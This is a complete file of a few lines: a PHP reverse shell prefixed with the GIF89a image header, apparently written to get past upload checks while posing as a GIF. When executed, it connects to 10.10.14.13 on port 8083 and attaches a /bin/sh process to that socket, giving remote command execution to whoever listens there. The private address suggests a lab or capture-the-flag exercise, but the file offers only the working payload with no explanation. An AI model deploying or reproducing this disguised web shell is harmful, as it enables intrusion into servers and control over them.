GIF89a<?php 
$ip = '10.10.14.13';
$port = 8083;
$f = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', [0 => $f, 1 => $f, 2 => $f], $pipes);
?>
